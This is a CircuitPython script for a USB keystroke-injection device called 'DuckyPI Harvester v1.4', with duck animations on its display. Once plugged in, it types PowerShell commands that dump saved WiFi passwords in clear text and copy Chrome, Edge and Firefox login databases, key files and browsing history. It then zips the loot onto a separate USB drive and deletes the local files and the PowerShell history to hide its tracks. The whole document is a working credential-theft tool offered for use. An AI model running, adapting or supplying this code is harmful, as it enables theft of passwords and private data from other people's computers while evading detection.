# DUCKYPI HARVESTER v1.4 - ANIMATED EDITION
# 
# SAFE MODE: Turn ON Caps Lock BEFORE plugging in
# HARVEST MODE: Caps Lock OFF when plugging in
#
# WORKFLOW:
# 1. Boot animation: Spinning duck logo (from SD card)
# 2. Harvests data to target Desktop (temp folder)
# 3. COMPRESSES loot to ZIP archive
# 4. Copies ZIP to DUCKYPI USB drive (separate from HackyPi)
# 5. Deletes temp folder and ZIP from Desktop
# 6. GREEN SCREEN with victory duck = Done, safe to unplug
#
# REQUIRES: SD card with /assets/ folder & /fonts/ folder containing duck sprites
# NOTE: Insert a USB drive named "DUCKYPI" alongside the HackyPi

import time
import board
import usb_hid
import digitalio
import busio
import terminalio
import displayio
import storage
import os
import adafruit_sdcard
import adafruit_imageload
from adafruit_display_text import label
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS as KeyboardLayout
from adafruit_st7789 import ST7789
from adafruit_bitmap_font import bitmap_font

# ============================================
# CONFIGURATION
# ============================================
COUNTDOWN_SECONDS = 5
CMD_DELAY = 1.0
SD_MOUNTED = False
CUSTOM_FONT = None  # Will be loaded after SD mount

# Colors
BLACK = 0x000000
GREEN = 0x00FF00
RED = 0xFF0000
PINK = 0xFF6B5C
WHITE = 0xFFFFFF
CYAN = 0x00FFFF

# ============================================
# DISPLAY SETUP
# ============================================
displayio.release_displays()
spi_display = busio.SPI(clock=board.GP10, MOSI=board.GP11)
backlight = digitalio.DigitalInOut(board.GP13)
backlight.direction = digitalio.Direction.OUTPUT
backlight.value = True
display_bus = displayio.FourWire(spi_display, command=board.GP8, chip_select=board.GP9, reset=board.GP12)
display = ST7789(display_bus, rotation=90, width=240, height=135, rowstart=40, colstart=53)
splash = displayio.Group()
display.show(splash)

# ============================================
# SD CARD SETUP
# ============================================
def mount_sd():
    global SD_MOUNTED, CUSTOM_FONT
    try:
        spi_sd = busio.SPI(board.GP18, board.GP19, board.GP16)
        cs_sd = digitalio.DigitalInOut(board.GP17)
        sdcard = adafruit_sdcard.SDCard(spi_sd, cs_sd)
        vfs = storage.VfsFat(sdcard)
        storage.mount(vfs, "/sd")
        SD_MOUNTED = True
        # Load custom font from SD card
        try:
            CUSTOM_FONT = bitmap_font.load_font("/sd/fonts/vt323_12.bdf")
        except:
            CUSTOM_FONT = None
        return True
    except:
        SD_MOUNTED = False
        CUSTOM_FONT = None
        return False

def get_font():
    """Return custom font if available, otherwise fallback to terminalio.FONT"""
    return CUSTOM_FONT if CUSTOM_FONT else terminalio.FONT

# Try to mount SD card at startup
mount_sd()

# ============================================
# DISPLAY FUNCTIONS
# ============================================
def clear_display():
    while len(splash) > 0:
        splash.pop()

def solid_screen(color):
    clear_display()
    bitmap = displayio.Bitmap(display.width, display.height, 1)
    palette = displayio.Palette(1)
    palette[0] = color
    splash.append(displayio.TileGrid(bitmap, pixel_shader=palette))

def show_text(line1, line2="", line3="", color=WHITE):
    clear_display()
    # Background
    bitmap = displayio.Bitmap(display.width, display.height, 1)
    palette = displayio.Palette(1)
    palette[0] = BLACK
    splash.append(displayio.TileGrid(bitmap, pixel_shader=palette))
    # Text lines
    y_positions = [30, 60, 90]
    for i, text in enumerate([line1, line2, line3]):
        if text:
            lbl = label.Label(get_font(), text=text, color=color)
            grp = displayio.Group(scale=2, x=10, y=y_positions[i])
            grp.append(lbl)
            splash.append(grp)

def animate(msg, duration=1.0, color=PINK):
    for i in range(3):
        show_text(msg + "." * (i + 1), "", "", color)
        time.sleep(duration / 3)

# ============================================
# DUCK SPRITE FUNCTIONS
# ============================================
def load_sprite(path):
    """Load a BMP sprite from SD card"""
    try:
        bitmap, palette = adafruit_imageload.load(path, bitmap=displayio.Bitmap, palette=displayio.Palette)
        return bitmap, palette
    except:
        return None, None

def spin_duck(rotations=2, speed=0.08):
    """Play spinning duck boot animation"""
    if not SD_MOUNTED:
        return
    
    clear_display()
    # Black background
    bg = displayio.Bitmap(display.width, display.height, 1)
    bg_pal = displayio.Palette(1)
    bg_pal[0] = BLACK
    splash.append(displayio.TileGrid(bg, pixel_shader=bg_pal))
    
    # Load spin frames
    frames = []
    for i in range(8):
        bmp, pal = load_sprite(f"/sd/assets/duck_spin_{i}.bmp")
        if bmp:
            frames.append((bmp, pal))
    
    if not frames:
        return
    
    # Create sprite group centered on screen
    duck_group = displayio.Group(x=88, y=35)  # Center for 64x64 sprite on 240x135
    sprite = displayio.TileGrid(frames[0][0], pixel_shader=frames[0][1])
    duck_group.append(sprite)
    splash.append(duck_group)
    
    # Animate spin
    for _ in range(rotations):
        for i, (bmp, pal) in enumerate(frames):
            duck_group.pop()
            duck_group.append(displayio.TileGrid(bmp, pixel_shader=pal))
            time.sleep(speed)

def show_text_with_duck(line1, line2="", line3="", color=PINK, duck_sprite="duck_hack"):
    """Show text with small duck mascot in corner"""
    clear_display()
    
    # Black background
    bg = displayio.Bitmap(display.width, display.height, 1)
    bg_pal = displayio.Palette(1)
    bg_pal[0] = BLACK
    splash.append(displayio.TileGrid(bg, pixel_shader=bg_pal))
    
    # Load duck sprite (if SD mounted)
    if SD_MOUNTED:
        bmp, pal = load_sprite(f"/sd/assets/{duck_sprite}.bmp")
        if bmp:
            duck = displayio.TileGrid(bmp, pixel_shader=pal, x=188, y=5)  # Top right
            splash.append(duck)
    
    # Text lines (shifted left to make room for duck)
    y_positions = [30, 60, 90]
    for i, text in enumerate([line1, line2, line3]):
        if text:
            lbl = label.Label(get_font(), text=text, color=color)
            grp = displayio.Group(scale=2, x=10, y=y_positions[i])
            grp.append(lbl)
            splash.append(grp)

def show_victory():
    """Show victory screen with celebrating duck"""
    clear_display()
    
    # Green background
    bg = displayio.Bitmap(display.width, display.height, 1)
    bg_pal = displayio.Palette(1)
    bg_pal[0] = GREEN
    splash.append(displayio.TileGrid(bg, pixel_shader=bg_pal))
    
    # Load victory duck
    if SD_MOUNTED:
        bmp, pal = load_sprite("/sd/assets/duck_done.bmp")
        if bmp:
            duck = displayio.TileGrid(bmp, pixel_shader=pal, x=96, y=43)  # Center
            splash.append(duck)

# ============================================
# SAFE MODE
# ============================================
def enter_safe_mode():
    show_text("SAFE MODE", "FILE ACCESS", "UNPLUG WHEN DONE", CYAN)
    while True:
        time.sleep(1)

# ============================================
# MAIN HARVESTER
# ============================================
def main():
    # Boot animation with spinning duck
    spin_duck(rotations=2, speed=0.08)
    show_text("DUCKYPI", "HARVESTER v1.4", "", PINK)
    time.sleep(1)
    
    # Initialize HID
    animate("INIT HID", 1.0, PINK)
    try:
        kbd = Keyboard(usb_hid.devices)
        layout = KeyboardLayout(kbd)
    except:
        show_text("ERROR", "NO USB HID", "", RED)
        return
    
    show_text("HID READY", "", "", GREEN)
    time.sleep(0.5)
    
    # Countdown with Caps Lock check
    for i in range(COUNTDOWN_SECONDS, 0, -1):
        if kbd.led_on(Keyboard.LED_CAPS_LOCK):
            enter_safe_mode()
            return
        show_text("STANDBY", f"T-{i}", "CAPS=SAFE", PINK)
        time.sleep(1)
    
    animate("ENGAGING", 0.8, PINK)
    
    # ========================================
    # STEP 1: Open PowerShell
    # ========================================
    show_text_with_duck("POWERSHELL", "", "[1/9]", PINK, "duck_hack")
    kbd.send(Keycode.WINDOWS, Keycode.R)
    time.sleep(0.5)
    layout.write('powershell')
    time.sleep(0.3)
    kbd.send(Keycode.ENTER)
    time.sleep(2.5)
    
    # ========================================
    # STEP 2: Create Loot Folder on Desktop
    # ========================================
    show_text_with_duck("CREATING", "LOOT FOLDER", "[2/9]", PINK, "duck_hack")
    cmd = "$ts=Get-Date -Format 'yyyyMMdd_HHmmss';"
    cmd += "$loot=\"$env:USERPROFILE\\Desktop\\LOOT_$ts\";"
    cmd += "mkdir $loot -Force|Out-Null;"
    cmd += "mkdir \"$loot\\browsers\" -Force|Out-Null;"
    cmd += "'Started: '+(Get-Date)|Out-File \"$loot\\log.txt\""
    layout.write(cmd)
    kbd.send(Keycode.ENTER)
    time.sleep(CMD_DELAY)
    
    # ========================================
    # STEP 3: Harvest WiFi
    # ========================================
    show_text_with_duck("HARVESTING", "WIFI", "[3/9]", PINK, "duck_wifi")
    cmd = "$w=@('=== WIFI CREDENTIALS ===','');"
    cmd += "netsh wlan show profiles|Select-String 'All User Profile'|%{"
    cmd += "$n=$_.ToString().Split(':')[1].Trim();"
    cmd += "$k=(netsh wlan show profile name=\"$n\" key=clear|Select-String 'Key Content');"
    cmd += "if($k){$p=$k.ToString().Split(':')[1].Trim()}else{$p='(none)'};"
    cmd += "$w+=\"$n : $p\"};"
    cmd += "$w|Out-File \"$loot\\wifi.txt\" -Encoding ASCII;"
    cmd += "'WiFi done'|Out-File \"$loot\\log.txt\" -Append"
    layout.write(cmd)
    kbd.send(Keycode.ENTER)
    time.sleep(CMD_DELAY * 3)
    
    # ========================================
    # STEP 4: Harvest System Info
    # ========================================
    show_text_with_duck("HARVESTING", "SYSTEM INFO", "[4/9]", PINK, "duck_hack")
    cmd = "@('=== SYSTEM INFO ===','Host: '+$env:COMPUTERNAME,"
    cmd += "'User: '+$env:USERNAME,'Domain: '+$env:USERDOMAIN,'',"
    cmd += "'=== NETWORK ===','',(ipconfig|Out-String))|Out-File \"$loot\\sysinfo.txt\" -Encoding ASCII;"
    cmd += "'Sysinfo done'|Out-File \"$loot\\log.txt\" -Append"
    layout.write(cmd)
    kbd.send(Keycode.ENTER)
    time.sleep(CMD_DELAY * 2)
    
    # ========================================
    # STEP 5: Harvest Chrome
    # ========================================
    show_text_with_duck("HARVESTING", "CHROME", "[5/9]", PINK, "duck_hack")
    cmd = "$c=\"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\";"
    cmd += "if(Test-Path \"$c\\Login Data\"){Copy-Item \"$c\\Login Data\" \"$loot\\browsers\\chrome_logins.db\" -Force};"
    cmd += "if(Test-Path \"$c\\History\"){Copy-Item \"$c\\History\" \"$loot\\browsers\\chrome_history.db\" -Force};"
    cmd += "'Chrome done'|Out-File \"$loot\\log.txt\" -Append"
    layout.write(cmd)
    kbd.send(Keycode.ENTER)
    time.sleep(CMD_DELAY * 2)
    
    # ========================================
    # STEP 6: Harvest Edge
    # ========================================
    show_text_with_duck("HARVESTING", "EDGE", "[6/9]", PINK, "duck_hack")
    cmd = "$e=\"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\";"
    cmd += "if(Test-Path \"$e\\Login Data\"){Copy-Item \"$e\\Login Data\" \"$loot\\browsers\\edge_logins.db\" -Force};"
    cmd += "if(Test-Path \"$e\\History\"){Copy-Item \"$e\\History\" \"$loot\\browsers\\edge_history.db\" -Force};"
    cmd += "'Edge done'|Out-File \"$loot\\log.txt\" -Append"
    layout.write(cmd)
    kbd.send(Keycode.ENTER)
    time.sleep(CMD_DELAY)
    
    # ========================================
    # STEP 7: Harvest Firefox
    # ========================================
    show_text_with_duck("HARVESTING", "FIREFOX", "[7/9]", PINK, "duck_hack")
    cmd = "$f=\"$env:APPDATA\\Mozilla\\Firefox\\Profiles\";"
    cmd += "if(Test-Path $f){Get-ChildItem $f -Directory|%{"
    cmd += "Copy-Item \"$($_.FullName)\\logins.json\" \"$loot\\browsers\\ff_logins.json\" -Force -EA SilentlyContinue;"
    cmd += "Copy-Item \"$($_.FullName)\\key4.db\" \"$loot\\browsers\\ff_key4.db\" -Force -EA SilentlyContinue;"
    cmd += "Copy-Item \"$($_.FullName)\\places.sqlite\" \"$loot\\browsers\\ff_history.db\" -Force -EA SilentlyContinue}};"
    cmd += "'Firefox done'|Out-File \"$loot\\log.txt\" -Append"
    layout.write(cmd)
    kbd.send(Keycode.ENTER)
    time.sleep(CMD_DELAY * 2)
    
    # ========================================
    # STEP 8: Create Summary, Compress & Copy to DUCKYPI USB
    # ========================================
    show_text_with_duck("COMPRESSING", "TO DUCKYPI", "[8/9]", PINK, "duck_hack")
    
    # Find DUCKYPI USB drive, create summary, COMPRESS to ZIP, copy ZIP, cleanup
    cmd = "$dp=$null;"
    cmd += "'D','E','F','G','H','I','J','K','L'|%{if(Test-Path \"${_}:\\\"){try{if([IO.DriveInfo]::new(\"${_}:\").VolumeLabel -eq 'DUCKYPI'){$dp=\"${_}:\\\"}}catch{}}};"
    cmd += "if($dp){"
    # Create summary
    cmd += "$files=Get-ChildItem $loot -Recurse -File;"
    cmd += "@('=== HARVEST REPORT ===',\"Target: $env:COMPUTERNAME\\$env:USERNAME\","
    cmd += "\"Time: $(Get-Date)\",\"Files: $($files.Count)\",'',($files|%{$_.Name})|Out-String)|Out-File \"$loot\\SUMMARY.txt\" -Encoding ASCII;"
    cmd += "'Summary done'|Out-File \"$loot\\log.txt\" -Append;"
    # Compress to ZIP (on Desktop first)
    cmd += "$zipPath=\"$env:USERPROFILE\\Desktop\\$(Split-Path $loot -Leaf).zip\";"
    cmd += "Compress-Archive -Path \"$loot\\*\" -DestinationPath $zipPath -Force;"
    cmd += "'Compressed to ZIP'|Out-File \"$loot\\log.txt\" -Append;"
    # Copy ZIP to DUCKYPI USB
    cmd += "Copy-Item $zipPath $dp -Force;"
    cmd += "'Copied ZIP to: '+$dp|Out-File \"$loot\\log.txt\" -Append;"
    # Delete folder and ZIP from Desktop
    cmd += "Remove-Item $loot -Recurse -Force;"
    cmd += "Remove-Item $zipPath -Force;"
    cmd += "}"
    layout.write(cmd)
    kbd.send(Keycode.ENTER)
    time.sleep(CMD_DELAY * 4)
    
    # ========================================
    # STEP 9: Cleanup & Exit PowerShell
    # ========================================
    show_text_with_duck("CLEANUP", "& EXIT", "[9/9]", PINK, "duck_done")
    cmd = "Clear-History;Remove-Item (Get-PSReadlineOption).HistorySavePath -EA SilentlyContinue;exit"
    layout.write(cmd)
    kbd.send(Keycode.ENTER)
    time.sleep(0.5)
    
    # ========================================
    # SUCCESS - VICTORY SCREEN
    # ========================================
    show_victory()
    
    # Hold forever - green screen confirms harvest complete and loot saved to DUCKYPI USB
    while True:
        time.sleep(1)

# Run
main()
